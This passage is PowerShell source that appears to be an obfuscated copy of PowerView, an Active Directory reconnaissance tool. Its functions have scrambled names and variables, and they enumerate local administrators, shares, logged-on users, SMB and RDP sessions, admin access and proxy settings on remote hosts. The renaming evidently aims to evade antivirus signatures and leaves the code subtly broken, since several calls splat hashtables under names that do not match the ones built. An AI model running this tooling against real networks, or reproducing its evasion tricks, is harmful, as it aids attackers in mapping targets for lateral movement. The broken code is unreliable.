            $VrICpjXS99['Identity'] = '*'
        }
        elseif ($NMaUgVLh99 -eq 'Domain') {
            $VrICpjXS99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($NMaUgVLh99 -eq 'DomainController') -or ($NMaUgVLh99 -eq 'DC')) {
            $VrICpjXS99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $VrICpjXS99['Identity'] = $NMaUgVLh99
        }
        $wxIeRxbZ99 = funereal @SearcherArguments
        ForEach ($GPO in $wxIeRxbZ99) {
            $TYbdeGZR99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $ThYnVhtt99 =  @{
                'GptTmplPath' = $TYbdeGZR99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ThYnVhtt99['Credential'] = $xjRyyQze99 }
            expending @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function indicate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $yCCcshgi99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            if ($yCCcshgi99 -eq 'API') {
                $BmhPJvUO99 = 1
                $WlFAblwQ99 = [IntPtr]::Zero
                $nlUDtDPR99 = 0
                $aholQEJD99 = 0
                $aRurfkkR99 = 0
                $XUqUetvM99 = $wMXdfulj99::NetLocalGroupEnum($zNIilCKh99, $BmhPJvUO99, [ref]$WlFAblwQ99, -1, [ref]$nlUDtDPR99, [ref]$aholQEJD99, [ref]$aRurfkkR99)
                $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
                if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                    $uXfcgJyx99 = $BCzmuvos99::GetSize()
                    for ($i = 0; ($i -lt $nlUDtDPR99); $i++) {
                        $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                        $Info = $CguibrMj99 -as $BCzmuvos99
                        $MmzaDoyA99 = $CguibrMj99.ToInt64()
                        $MmzaDoyA99 += $uXfcgJyx99
                        $FJbkDBjb99 = New-Object PSObject
                        $FJbkDBjb99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                        $FJbkDBjb99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $FJbkDBjb99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $FJbkDBjb99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $FJbkDBjb99
                    }
                    $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
                }
                else {
                    Write-Verbose "[indicate] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
                }
            }
            else {
                $LKlyvBTP99 = [ADSI]"WinNT://$zNIilCKh99,computer"
                $LKlyvBTP99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $FJbkDBjb99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $Group | Add-Member Noteproperty 'GroupName' ($FJbkDBjb99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($FJbkDBjb99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($FJbkDBjb99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function Dutch {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $KegVfEPD99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $yCCcshgi99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            if ($yCCcshgi99 -eq 'API') {
                $BmhPJvUO99 = 2
                $WlFAblwQ99 = [IntPtr]::Zero
                $nlUDtDPR99 = 0
                $aholQEJD99 = 0
                $aRurfkkR99 = 0
                $XUqUetvM99 = $wMXdfulj99::NetLocalGroupGetMembers($zNIilCKh99, $KegVfEPD99, $BmhPJvUO99, [ref]$WlFAblwQ99, -1, [ref]$nlUDtDPR99, [ref]$aholQEJD99, [ref]$aRurfkkR99)
                $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
                $gwHuJhvi99 = @()
                if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                    $uXfcgJyx99 = $qiESIIRf99::GetSize()
                    for ($i = 0; ($i -lt $nlUDtDPR99); $i++) {
                        $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                        $Info = $CguibrMj99 -as $qiESIIRf99
                        $MmzaDoyA99 = $CguibrMj99.ToInt64()
                        $MmzaDoyA99 += $uXfcgJyx99
                        $JtTrVisx99 = ''
                        $xinaTGEh99 = $tXXKHaBR99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$JtTrVisx99);$LgkmIaxQ99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($xinaTGEh99 -eq 0) {
                            Write-Verbose "[Dutch] Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
                        }
                        else {
                            $FEdwNfjR99 = New-Object PSObject
                            $FEdwNfjR99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                            $FEdwNfjR99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                            $FEdwNfjR99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $FEdwNfjR99 | Add-Member Noteproperty 'SID' $JtTrVisx99
                            $sJkpOPAV99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $FEdwNfjR99 | Add-Member Noteproperty 'IsGroup' $sJkpOPAV99
                            $FEdwNfjR99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $gwHuJhvi99 += $FEdwNfjR99
                        }
                    }
                    $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
                    $vdOhZInA99 = $gwHuJhvi99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($vdOhZInA99) {
                        $vdOhZInA99 = $vdOhZInA99.Substring(0, $vdOhZInA99.LastIndexOf('-'))
                        $gwHuJhvi99 | ForEach-Object {
                            if ($_.SID -match $vdOhZInA99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $gwHuJhvi99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $gwHuJhvi99
                }
                else {
                    Write-Verbose "[Dutch] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
                }
            }
            else {
                try {
                    $tSUfhlzf99 = [ADSI]"WinNT://$zNIilCKh99/$KegVfEPD99,group"
                    $tSUfhlzf99.psbase.Invoke('Members') | ForEach-Object {
                        $FEdwNfjR99 = New-Object PSObject
                        $FEdwNfjR99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                        $FEdwNfjR99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                        $lTevLEWa99 = ([ADSI]$_)
                        $zVueuEQy99 = $lTevLEWa99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $sJkpOPAV99 = ($lTevLEWa99.SchemaClassName -like 'group')
                        if(([regex]::Matches($zVueuEQy99, '/')).count -eq 1) {
                            $RbnszArl99 = $True
                            $Name = $zVueuEQy99.Replace('/', '\')
                        }
                        else {
                            $RbnszArl99 = $False
                            $Name = $zVueuEQy99.Substring($zVueuEQy99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $FEdwNfjR99 | Add-Member Noteproperty 'AccountName' $Name
                        $FEdwNfjR99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($lTevLEWa99.InvokeGet('ObjectSID'),0)).Value)
                        $FEdwNfjR99 | Add-Member Noteproperty 'IsGroup' $sJkpOPAV99
                        $FEdwNfjR99 | Add-Member Noteproperty 'IsDomain' $RbnszArl99
                        $FEdwNfjR99
                    }
                }
                catch {
                    Write-Verbose "[Dutch] Error for $zNIilCKh99 : $_"
                }
            }
        }
    }
    
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function overstatement {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $BmhPJvUO99 = 1
            $WlFAblwQ99 = [IntPtr]::Zero
            $nlUDtDPR99 = 0
            $aholQEJD99 = 0
            $aRurfkkR99 = 0
            $XUqUetvM99 = $wMXdfulj99::NetShareEnum($zNIilCKh99, $BmhPJvUO99, [ref]$WlFAblwQ99, -1, [ref]$nlUDtDPR99, [ref]$aholQEJD99, [ref]$aRurfkkR99)
            $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
            if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                $uXfcgJyx99 = $SMMHPgZe99::GetSize()
                for ($i = 0; ($i -lt $nlUDtDPR99); $i++) {
                    $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                    $Info = $CguibrMj99 -as $SMMHPgZe99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $MmzaDoyA99 = $CguibrMj99.ToInt64()
                    $MmzaDoyA99 += $uXfcgJyx99
                    $Share
                }
                $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
            }
            else {
                Write-Verbose "[overstatement] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function silvan {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $BmhPJvUO99 = 1
            $WlFAblwQ99 = [IntPtr]::Zero
            $nlUDtDPR99 = 0
            $aholQEJD99 = 0
            $aRurfkkR99 = 0
            $XUqUetvM99 = $wMXdfulj99::NetWkstaUserEnum($zNIilCKh99, $BmhPJvUO99, [ref]$WlFAblwQ99, -1, [ref]$nlUDtDPR99, [ref]$aholQEJD99, [ref]$aRurfkkR99)
            $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
            if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                $uXfcgJyx99 = $almcBnNv99::GetSize()
                for ($i = 0; ($i -lt $nlUDtDPR99); $i++) {
                    $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                    $Info = $CguibrMj99 -as $almcBnNv99
                    $FJiCdsSg99 = $Info | Select-Object *
                    $FJiCdsSg99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $FJiCdsSg99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $MmzaDoyA99 = $CguibrMj99.ToInt64()
                    $MmzaDoyA99 += $uXfcgJyx99
                    $FJiCdsSg99
                }
                $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
            }
            else {
                Write-Verbose "[silvan] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function immaculately {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $BmhPJvUO99 = 10
            $WlFAblwQ99 = [IntPtr]::Zero
            $nlUDtDPR99 = 0
            $aholQEJD99 = 0
            $aRurfkkR99 = 0
            $XUqUetvM99 = $wMXdfulj99::NetSessionEnum($zNIilCKh99, '', $QuaUtxHk99, $BmhPJvUO99, [ref]$WlFAblwQ99, -1, [ref]$nlUDtDPR99, [ref]$aholQEJD99, [ref]$aRurfkkR99)
            $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
            if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                $uXfcgJyx99 = $XyTkCZel99::GetSize()
                for ($i = 0; ($i -lt $nlUDtDPR99); $i++) {
                    $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                    $Info = $CguibrMj99 -as $XyTkCZel99
                    $LSgYBfLL99 = $Info | Select-Object *
                    $LSgYBfLL99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $LSgYBfLL99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $MmzaDoyA99 = $CguibrMj99.ToInt64()
                    $MmzaDoyA99 += $uXfcgJyx99
                    $LSgYBfLL99
                }
                $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
            }
            else {
                Write-Verbose "[immaculately] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function stymies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$lgkTdAeF99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $QuaUtxHk99 = exaggerations -ObjectSID $_ -xilKAxpM99 'DomainSimple'
                    if ($QuaUtxHk99) {
                        $QuaUtxHk99, $qgzVOkSs99 = $QuaUtxHk99.Split('@')
                    }
                    else {
                        $QuaUtxHk99 = $_
                        $qgzVOkSs99 = $Null
                    }
                    $WhjcKfzG99 = New-Object PSObject
                    $WhjcKfzG99 | Add-Member Noteproperty 'ComputerName' "$lgkTdAeF99"
                    $WhjcKfzG99 | Add-Member Noteproperty 'UserDomain' $qgzVOkSs99
                    $WhjcKfzG99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
                    $WhjcKfzG99 | Add-Member Noteproperty 'UserSID' $_
                    $WhjcKfzG99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $WhjcKfzG99
                }
            }
            catch {
                Write-Verbose "[stymies] Error opening remote registry on '$lgkTdAeF99' : $_"
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function spasmodic {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $LWIaxRND99 = $MmtBvTcD99::WTSOpenServerEx($zNIilCKh99)
            if ($LWIaxRND99 -ne 0) {
                $CNhKwUCK99 = [IntPtr]::Zero
                $vzGuFlwZ99 = 0
                $XUqUetvM99 = $MmtBvTcD99::WTSEnumerateSessionsEx($LWIaxRND99, [ref]1, 0, [ref]$CNhKwUCK99, [ref]$vzGuFlwZ99);$LgkmIaxQ99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $MmzaDoyA99 = $CNhKwUCK99.ToInt64()
                if (($XUqUetvM99 -ne 0) -and ($MmzaDoyA99 -gt 0)) {
                    $uXfcgJyx99 = $FfLkWDit99::GetSize()
                    for ($i = 0; ($i -lt $vzGuFlwZ99); $i++) {
                        $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                        $Info = $CguibrMj99 -as $FfLkWDit99
                        $YLJyBPDK99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $YLJyBPDK99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $YLJyBPDK99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                        }
                        $YLJyBPDK99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $YLJyBPDK99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $YLJyBPDK99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $YLJyBPDK99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $YLJyBPDK99 | Add-Member Noteproperty 'State' $Info.State
                        $WaILGddJ99 = [IntPtr]::Zero
                        $INUeMhHN99 = 0
                        $xinaTGEh99 = $MmtBvTcD99::WTSQuerySessionInformation($LWIaxRND99, $Info.SessionID, 14, [ref]$WaILGddJ99, [ref]$INUeMhHN99);$AnwaYHKW99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($xinaTGEh99 -eq 0) {
                            Write-Verbose "[spasmodic] Error: $(([ComponentModel.Win32Exception] $AnwaYHKW99).Message)"
                        }
                        else {
                            $SehyRRGh99 = $WaILGddJ99.ToInt64()
                            $ADHdJSHt99 = New-Object System.Intptr -ArgumentList $SehyRRGh99
                            $Info2 = $ADHdJSHt99 -as $WOIMplSf99
                            $gnDsKTfZ99 = $Info2.Address
                            if ($gnDsKTfZ99[2] -ne 0) {
                                $gnDsKTfZ99 = [String]$gnDsKTfZ99[2]+'.'+[String]$gnDsKTfZ99[3]+'.'+[String]$gnDsKTfZ99[4]+'.'+[String]$gnDsKTfZ99[5]
                            }
                            else {
                                $gnDsKTfZ99 = $Null
                            }
                            $YLJyBPDK99 | Add-Member Noteproperty 'SourceIP' $gnDsKTfZ99
                            $YLJyBPDK99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $YLJyBPDK99
                            $Null = $MmtBvTcD99::WTSFreeMemory($WaILGddJ99)
                            $MmzaDoyA99 += $uXfcgJyx99
                        }
                    }
                    $Null = $MmtBvTcD99::WTSFreeMemoryEx(2, $CNhKwUCK99, $vzGuFlwZ99)
                }
                else {
                    Write-Verbose "[spasmodic] Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
                }
                $Null = $MmtBvTcD99::WTSCloseServer($LWIaxRND99)
            }
            else {
                Write-Verbose "[spasmodic] Error opening the Remote Desktop Session Host (RD Session Host) server for: $lgkTdAeF99"
            }
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function portent {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $LWIaxRND99 = $tXXKHaBR99::OpenSCManagerW("\\$zNIilCKh99", 'ServicesActive', 0xF003F);$LgkmIaxQ99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $HAxuBjPR99 = New-Object PSObject
            $HAxuBjPR99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
            if ($LWIaxRND99 -ne 0) {
                $Null = $tXXKHaBR99::CloseServiceHandle($LWIaxRND99)
                $HAxuBjPR99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[portent] Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
                $HAxuBjPR99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $HAxuBjPR99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $HAxuBjPR99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function partakes {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
        }
    }
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            if ($zNIilCKh99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $YvEStgCe99 = $zNIilCKh99
                $zNIilCKh99 = [System.Net.Dns]::GetHostByAddress($zNIilCKh99) | Select-Object -ExpandProperty HostName
            }
            else {
                $YvEStgCe99 = @(prioritize -lgkTdAeF99 $zNIilCKh99)[0].IPAddress
            }
            $WlFAblwQ99 = [IntPtr]::Zero
            $XUqUetvM99 = $wMXdfulj99::DsGetSiteName($zNIilCKh99, [ref]$WlFAblwQ99)
            $uCZWtsDx99 = New-Object PSObject
            $uCZWtsDx99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
            $uCZWtsDx99 | Add-Member Noteproperty 'IPAddress' $YvEStgCe99
            if ($XUqUetvM99 -eq 0) {
                $ixDINSpI99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($WlFAblwQ99)
                $uCZWtsDx99 | Add-Member Noteproperty 'SiteName' $ixDINSpI99
            }
            else {
                Write-Verbose "[partakes] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
                $uCZWtsDx99 | Add-Member Noteproperty 'SiteName' ''
            }
            $uCZWtsDx99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
            $uCZWtsDx99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function modules {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            try {
                $OVaBPDBZ99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $zNIilCKh99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $OVaBPDBZ99['Credential'] = $xjRyyQze99 }
                $fsgkpaJq99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $niVrcTfq99 = $fsgkpaJq99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $FPZxQymo99 = $fsgkpaJq99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($FPZxQymo99 -and ($FPZxQymo99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($FPZxQymo99)
                    }
                    catch {
                        Write-Warning "[modules] Error connecting to AutoConfigURL : $FPZxQymo99"
                    }
                }
                if ($niVrcTfq99 -or $FPZxQymo99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $Out | Add-Member Noteproperty 'ProxyServer' $niVrcTfq99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $FPZxQymo99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[modules] No proxy settings found for $lgkTdAeF99"
                }
            }
            catch {
                Write-Warning "[modules] Error enumerating proxy settings for $lgkTdAeF99 : $_"
            }
        }
    }
}
function expedites {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $HKLM = 2147483650
            $OVaBPDBZ99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $zNIilCKh99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $OVaBPDBZ99['Credential'] = $xjRyyQze99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
